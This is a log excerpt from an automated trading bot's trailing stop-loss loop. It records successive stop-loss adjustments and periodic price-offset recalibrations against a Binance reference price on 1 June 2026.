+2026-06-01 16:02:30  INFO      trail_loop — [TRAIL] Trail SL: 72700.49 → 72699.82 (stage 0 best=72649.37 src=tick)
+2026-06-01 16:02:30  INFO      trail_loop — [TRAIL] Trail SL: 72699.82 → 72699.63 (stage 0 best=72649.18 src=tick)
+2026-06-01 16:02:30  INFO      trail_loop — [TRAIL] Trail SL: 72699.63 → 72699.12 (stage 0 best=72648.67 src=tick)
+2026-06-01 16:02:31  INFO      trail_loop — [TRAIL] Trail SL: 72699.12 → 72698.75 (stage 0 best=72648.30 src=tick)
+2026-06-01 16:02:36  INFO      trail_loop — [TRAIL] Offset recalibrated: +19.76 → +16.72 (binance=72672.00 delta=72655.28)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72698.75 → 72698.46 (stage 0 best=72648.01 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72698.46 → 72697.93 (stage 0 best=72647.48 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.93 → 72697.79 (stage 0 best=72647.34 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.79 → 72697.77 (stage 0 best=72647.32 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.77 → 72697.75 (stage 0 best=72647.30 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.75 → 72697.74 (stage 0 best=72647.29 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.74 → 72697.73 (stage 0 best=72647.28 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.73 → 72697.47 (stage 0 best=72647.02 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.47 → 72697.32 (stage 0 best=72646.87 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.32 → 72697.31 (stage 0 best=72646.86 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.31 → 72697.21 (stage 0 best=72646.76 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72697.21 → 72696.95 (stage 0 best=72646.50 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72696.95 → 72696.94 (stage 0 best=72646.49 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72696.94 → 72696.84 (stage 0 best=72646.39 src=tick)
+2026-06-01 16:02:50  INFO      trail_loop — [TRAIL] Trail SL: 72696.84 → 72696.83 (stage 0 best=72646.38 src=tick)
+2026-06-01 16:02:54  INFO      trail_loop — [TRAIL] Trail SL: 72696.83 → 72693.30 (stage 0 best=72642.85 src=tick)
+2026-06-01 16:03:07  INFO      trail_loop — [TRAIL] Offset recalibrated: +16.72 → +18.03 (binance=72663.10 delta=72645.07)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72693.30 → 72692.97 (stage 0 best=72642.52 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.97 → 72692.87 (stage 0 best=72642.42 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.87 → 72692.72 (stage 0 best=72642.27 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.72 → 72692.43 (stage 0 best=72641.98 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.43 → 72692.42 (stage 0 best=72641.97 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.42 → 72692.28 (stage 0 best=72641.83 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.28 → 72692.21 (stage 0 best=72641.76 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72692.21 → 72691.90 (stage 0 best=72641.45 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72691.90 → 72691.76 (stage 0 best=72641.31 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72691.76 → 72691.75 (stage 0 best=72641.30 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72691.75 → 72691.51 (stage 0 best=72641.06 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72691.51 → 72691.49 (stage 0 best=72641.04 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72691.49 → 72690.96 (stage 0 best=72640.51 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.96 → 72690.90 (stage 0 best=72640.45 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.90 → 72690.74 (stage 0 best=72640.29 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.74 → 72690.73 (stage 0 best=72640.28 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.73 → 72690.50 (stage 0 best=72640.05 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.50 → 72690.46 (stage 0 best=72640.01 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.46 → 72690.44 (stage 0 best=72639.99 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.44 → 72690.43 (stage 0 best=72639.98 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.43 → 72690.42 (stage 0 best=72639.97 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.42 → 72690.40 (stage 0 best=72639.95 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72690.40 → 72689.99 (stage 0 best=72639.54 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.99 → 72689.89 (stage 0 best=72639.44 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.89 → 72689.88 (stage 0 best=72639.43 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.88 → 72689.70 (stage 0 best=72639.25 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.70 → 72689.52 (stage 0 best=72639.07 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.52 → 72689.51 (stage 0 best=72639.06 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.51 → 72689.32 (stage 0 best=72638.87 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72689.32 → 72688.82 (stage 0 best=72638.37 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.82 → 72688.72 (stage 0 best=72638.27 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.72 → 72688.66 (stage 0 best=72638.21 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.66 → 72688.52 (stage 0 best=72638.07 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.52 → 72688.43 (stage 0 best=72637.98 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.43 → 72688.42 (stage 0 best=72637.97 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.42 → 72688.00 (stage 0 best=72637.55 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72688.00 → 72687.99 (stage 0 best=72637.54 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72687.99 → 72687.96 (stage 0 best=72637.51 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72687.96 → 72686.43 (stage 0 best=72635.98 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72686.43 → 72686.42 (stage 0 best=72635.97 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72686.42 → 72686.05 (stage 0 best=72635.60 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72686.05 → 72686.04 (stage 0 best=72635.59 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72686.04 → 72686.02 (stage 0 best=72635.57 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72686.02 → 72685.96 (stage 0 best=72635.51 src=tick)
+2026-06-01 16:03:24  INFO      trail_loop — [TRAIL] Trail SL: 72685.96 → 72685.95 (stage 0 best=72635.50 src=tick)
+2026-06-01 16:03:29  INFO      trail_loop — [TRAIL] Trail SL: 72685.95 → 72685.46 (stage 0 best=72635.01 src=tick)
+2026-06-01 16:03:34  INFO      trail_loop — [TRAIL] Trail SL: 72685.46 → 72685.06 (stage 0 best=72634.61 src=tick)
+2026-06-01 16:03:37  INFO      trail_loop — [TRAIL] Offset recalibrated: +18.03 → +18.93 (binance=72653.54 delta=72634.61)
+2026-06-01 16:03:37  INFO      trail_loop — [TRAIL] Trail SL: 72685.06 → 72685.05 (stage 0 best=72634.60 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72685.05 → 72685.04 (stage 0 best=72634.59 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72685.04 → 72685.03 (stage 0 best=72634.58 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72685.03 → 72684.85 (stage 0 best=72634.40 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72684.85 → 72684.77 (stage 0 best=72634.32 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72684.77 → 72683.93 (stage 0 best=72633.48 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.93 → 72683.92 (stage 0 best=72633.47 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.92 → 72683.53 (stage 0 best=72633.08 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.53 → 72683.52 (stage 0 best=72633.07 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.52 → 72683.51 (stage 0 best=72633.06 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.51 → 72683.44 (stage 0 best=72632.99 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.44 → 72683.36 (stage 0 best=72632.91 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72683.36 → 72682.56 (stage 0 best=72632.11 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72682.56 → 72682.12 (stage 0 best=72631.67 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72682.12 → 72682.11 (stage 0 best=72631.66 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72682.11 → 72681.58 (stage 0 best=72631.13 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72681.58 → 72681.54 (stage 0 best=72631.09 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72681.54 → 72681.53 (stage 0 best=72631.08 src=tick)
+2026-06-01 16:03:54  INFO      trail_loop — [TRAIL] Trail SL: 72681.53 → 72681.52 (stage 0 best=72631.07 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72681.52 → 72681.51 (stage 0 best=72631.06 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72681.51 → 72681.12 (stage 0 best=72630.67 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72681.12 → 72680.28 (stage 0 best=72629.83 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72680.28 → 72680.25 (stage 0 best=72629.80 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72680.25 → 72680.24 (stage 0 best=72629.79 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72680.24 → 72680.21 (stage 0 best=72629.76 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72680.21 → 72679.98 (stage 0 best=72629.53 src=tick)
+2026-06-01 16:03:55  INFO      trail_loop — [TRAIL] Trail SL: 72679.98 → 72679.62 (stage 0 best=72629.17 src=tick)
+2026-06-01 16:03:59  INFO      trail_loop — [TRAIL] Trail SL: 72679.62 → 72679.48 (stage 0 best=72629.03 src=tick)
+2026-06-01 16:04:00  INFO      trail_loop — [TRAIL] Trail SL: 72679.48 → 72679.43 (stage 0 best=72628.98 src=tick)
+2026-06-01 16:04:00  INFO      trail_loop — [TRAIL] Trail SL: 72679.43 → 72679.42 (stage 0 best=72628.97 src=tick)
+2026-06-01 16:04:00  INFO      trail_loop — [TRAIL] Trail SL: 72679.42 → 72678.74 (stage 0 best=72628.29 src=tick)
+2026-06-01 16:04:00  INFO      trail_loop — [TRAIL] Trail SL: 72678.74 → 72678.60 (stage 0 best=72628.15 src=tick)
+2026-06-01 16:04:00  INFO      trail_loop — [TRAIL] Trail SL: 72678.60 → 72678.57 (stage 0 best=72628.12 src=tick)
+2026-06-01 16:04:00  INFO      trail_loop — [TRAIL] Trail SL: 72678.57 → 72677.92 (stage 0 best=72627.47 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72677.92 → 72677.91 (stage 0 best=72627.46 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72677.91 → 72677.53 (stage 0 best=72627.08 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72677.53 → 72677.52 (stage 0 best=72627.07 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72677.52 → 72677.47 (stage 0 best=72627.02 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72677.47 → 72676.77 (stage 0 best=72626.32 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72676.77 → 72676.70 (stage 0 best=72626.25 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72676.70 → 72676.55 (stage 0 best=72626.10 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72676.55 → 72676.53 (stage 0 best=72626.08 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72676.53 → 72676.32 (stage 0 best=72625.87 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72676.32 → 72676.15 (stage 0 best=72625.70 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72676.15 → 72675.80 (stage 0 best=72625.35 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72675.80 → 72675.69 (stage 0 best=72625.24 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72675.69 → 72675.59 (stage 0 best=72625.14 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72675.59 → 72675.53 (stage 0 best=72625.08 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72675.53 → 72675.52 (stage 0 best=72625.07 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72675.52 → 72674.97 (stage 0 best=72624.52 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72674.97 → 72674.96 (stage 0 best=72624.51 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72674.96 → 72674.95 (stage 0 best=72624.50 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72674.95 → 72674.94 (stage 0 best=72624.49 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72674.94 → 72674.35 (stage 0 best=72623.90 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72674.35 → 72674.08 (stage 0 best=72623.63 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72674.08 → 72673.90 (stage 0 best=72623.45 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72673.90 → 72673.82 (stage 0 best=72623.37 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72673.82 → 72673.65 (stage 0 best=72623.20 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72673.65 → 72673.54 (stage 0 best=72623.09 src=tick)
+2026-06-01 16:04:03  INFO      trail_loop — [TRAIL] Trail SL: 72673.54 → 72673.53 (stage 0 best=72623.08 src=tick)
+2026-06-01 16:04:08  INFO      trail_loop — [TRAIL] Offset recalibrated: +18.93 → +10.81 (binance=72642.01 delta=72631.20)
+2026-06-01 16:04:34  INFO      trail_loop — [TRAIL] Trail SL: 72673.53 → 72672.55 (stage 0 best=72622.10 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72672.55 → 72672.52 (stage 0 best=72622.07 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72672.52 → 72672.40 (stage 0 best=72621.95 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72672.40 → 72672.31 (stage 0 best=72621.86 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72672.31 → 72671.65 (stage 0 best=72621.20 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72671.65 → 72671.64 (stage 0 best=72621.19 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72671.64 → 72671.45 (stage 0 best=72621.00 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72671.45 → 72671.27 (stage 0 best=72620.82 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72671.27 → 72670.99 (stage 0 best=72620.54 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72670.99 → 72670.84 (stage 0 best=72620.39 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72670.84 → 72669.91 (stage 0 best=72619.46 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.91 → 72669.77 (stage 0 best=72619.32 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.77 → 72669.67 (stage 0 best=72619.22 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.67 → 72669.65 (stage 0 best=72619.20 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.65 → 72669.64 (stage 0 best=72619.19 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.64 → 72669.51 (stage 0 best=72619.06 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.51 → 72669.42 (stage 0 best=72618.97 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.42 → 72669.14 (stage 0 best=72618.69 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72669.14 → 72668.64 (stage 0 best=72618.19 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72668.64 → 72668.63 (stage 0 best=72618.18 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72668.63 → 72668.56 (stage 0 best=72618.11 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72668.56 → 72668.54 (stage 0 best=72618.09 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72668.54 → 72667.65 (stage 0 best=72617.20 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72667.65 → 72667.64 (stage 0 best=72617.19 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72667.64 → 72667.59 (stage 0 best=72617.14 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72667.59 → 72667.51 (stage 0 best=72617.06 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72667.51 → 72667.34 (stage 0 best=72616.89 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72667.34 → 72667.13 (stage 0 best=72616.68 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72667.13 → 72666.70 (stage 0 best=72616.25 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72666.70 → 72666.60 (stage 0 best=72616.15 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72666.60 → 72666.31 (stage 0 best=72615.86 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72666.31 → 72666.22 (stage 0 best=72615.77 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72666.22 → 72666.08 (stage 0 best=72615.63 src=tick)
+2026-06-01 16:04:37  INFO      trail_loop — [TRAIL] Trail SL: 72666.08 → 72665.72 (stage 0 best=72615.27 src=tick)
+2026-06-01 16:04:39  INFO      trail_loop — [TRAIL] Offset recalibrated: +10.81 → +3.90 (binance=72626.09 delta=72622.19)
+2026-06-01 16:04:44  INFO      trail_loop — [TRAIL] Trail SL: 72665.72 → 72658.17 (stage 0 best=72607.72 src=tick)
+2026-06-01 16:04:49  INFO      trail_loop — [TRAIL] Trail SL: 72658.17 → 72657.93 (stage 0 best=72607.48 src=tick)
+2026-06-01 16:04:54  INFO      trail_loop — [TRAIL] Trail SL: 72657.93 → 72657.66 (stage 0 best=72607.20 src=tick)
+2026-06-01 16:04:59  INFO      trail_loop — [TRAIL] Trail SL: 72657.66 → 72657.22 (stage 0 best=72606.76 src=tick)
+2026-06-01 16:05:09  INFO      trail_loop — [TRAIL] Offset recalibrated: +3.90 → +24.86 (binance=72659.32 delta=72634.46)
+2026-06-01 16:05:40  INFO      trail_loop — [TRAIL] Offset recalibrated: +24.86 → +18.60 (binance=72665.73 delta=72647.13)
+2026-06-01 16:06:11  INFO      trail_loop — [TRAIL] Offset recalibrated: +18.60 → +14.47 (binance=72640.00 delta=72625.53)
+2026-06-01 16:06:42  INFO      trail_loop — [TRAIL] Offset recalibrated: +14.47 → +15.98 (binance=72632.92 delta=72616.94)
+2026-06-01 16:07:13  INFO      trail_loop — [TRAIL] Offset recalibrated: +15.98 → +17.65 (binance=72647.49 delta=72629.84)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72657.22 → 72657.21 (stage 0 best=72606.76 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72657.21 → 72656.94 (stage 0 best=72606.49 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.94 → 72656.89 (stage 0 best=72606.44 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.89 → 72656.88 (stage 0 best=72606.43 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.88 → 72656.85 (stage 0 best=72606.40 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.85 → 72656.80 (stage 0 best=72606.35 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.80 → 72656.77 (stage 0 best=72606.32 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.77 → 72656.73 (stage 0 best=72606.28 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.73 → 72656.59 (stage 0 best=72606.14 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.59 → 72656.26 (stage 0 best=72605.81 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.26 → 72656.00 (stage 0 best=72605.55 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72656.00 → 72655.70 (stage 0 best=72605.25 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72655.70 → 72655.69 (stage 0 best=72605.24 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72655.69 → 72655.36 (stage 0 best=72604.91 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72655.36 → 72655.23 (stage 0 best=72604.78 src=tick)
+2026-06-01 16:07:30  INFO      trail_loop — [TRAIL] Trail SL: 72655.23 → 72654.80 (stage 0 best=72604.35 src=tick)
+2026-06-01 16:07:44  INFO      trail_loop — [TRAIL] Offset recalibrated: +17.65 → +16.47 (binance=72622.01 delta=72605.54)
+2026-06-01 16:08:15  INFO      trail_loop — [TRAIL] Offset recalibrated: +16.47 → +17.31 (binance=72622.01 delta=72604.70)
+2026-06-01 16:08:20  INFO      trail_loop — [TRAIL] Trail SL: 72654.80 → 72653.51 (stage 0 best=72603.06 src=tick)
+2026-06-01 16:08:25  INFO      trail_loop — [TRAIL] Trail SL: 72653.51 → 72653.50 (stage 0 best=72603.05 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72653.50 → 72653.29 (stage 0 best=72602.84 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72653.29 → 72653.15 (stage 0 best=72602.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72653.15 → 72653.14 (stage 0 best=72602.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72653.14 → 72653.12 (stage 0 best=72602.67 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72653.12 → 72652.84 (stage 0 best=72602.39 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.84 → 72652.83 (stage 0 best=72602.38 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.83 → 72652.82 (stage 0 best=72602.37 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.82 → 72652.36 (stage 0 best=72601.91 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.36 → 72652.35 (stage 0 best=72601.90 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.35 → 72652.34 (stage 0 best=72601.89 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.34 → 72652.30 (stage 0 best=72601.85 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.30 → 72652.18 (stage 0 best=72601.73 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.18 → 72652.17 (stage 0 best=72601.72 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72652.17 → 72651.94 (stage 0 best=72601.49 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.94 → 72651.52 (stage 0 best=72601.07 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.52 → 72651.51 (stage 0 best=72601.06 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.51 → 72651.49 (stage 0 best=72601.04 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.49 → 72651.39 (stage 0 best=72600.94 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.39 → 72651.34 (stage 0 best=72600.89 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.34 → 72651.15 (stage 0 best=72600.70 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.15 → 72651.14 (stage 0 best=72600.69 src=tick)
+2026-06-01 16:08:28  INFO      trail_loop — [TRAIL] Trail SL: 72651.14 → 72650.87 (stage 0 best=72600.42 src=tick)
